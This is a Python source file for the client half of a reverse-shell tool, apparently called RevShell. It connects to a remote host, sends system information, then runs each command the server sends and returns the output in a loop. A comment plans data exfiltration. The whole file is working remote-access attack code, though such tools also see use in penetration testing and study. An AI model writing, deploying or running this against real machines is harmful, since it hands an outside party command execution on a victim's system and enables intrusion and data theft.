# TODO: create handling for data exfiltration
from .nodeutils import (
    os,
    shutil,
    Path,
    subprocess,
    struct,
    sys,
    socket,
    StreamSocket,
    utils
)


class Client(StreamSocket):
    """TCP socket client class for the command shell"""
    def __init__(self, rhost: str, port: int, shell: str, verb: bool, debug: bool):
        super().__init__(rhost, port, shell, verb, debug)

    def connect(self) -> None:
        """Initiate connection to remote server shell"""
        # TODO: spawn process for shell instead running single commands
        # TODO: configure timeouts and blocking

        sock = socket.socket()
        #sock.settimeout(60)
        #executable = self.get_exec()

        try:
            sock.connect((self.Address, self.Port))
        except socket.timeout:
            utils.throw(f"Connection with {self.Address}, timed out.")
        except:
            utils.throw(f"Could not establish connection with {self.Address}")

        try:
            # receive => established message
            establish_msg = self.receive(sock).decode()
            utils.status(establish_msg)

            # send => system information
            sysinfo = self.sys_info()
            self.send(sock, sysinfo)

            # TODO: add code to send working directory to server each iteration
            # TODO: to achieve => send input right back, add condition in server logic

            while True:
                # receive => command to execute
                command = self.receive(sock).decode()
                family = self.check_special(command)

                if family != "exit":
                    stdout, stderr = self.execute(command)

                    # TODO: update displayed path after changed directory

                    if stdout != b"":
                        output = stdout
                        level = "output"
                    else:
                        output = stderr
                        level = "error"

                    if self.Debug:
                        utils.status(bytes(output).decode(), level, command)
                    elif self.Verbose:
                        utils.status(f"stdin => [{command}]", level)

                    # send => command output
                    self.send(sock, output)
                else:
                    if self.Verbose:
                        utils.status("stdin => [exit]", "output")
                        utils.status("Exiting RevShell.")
                    break
        except Exception as exc:
            self.except_handler(exc)
        finally:
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            finally:
                sock.close()
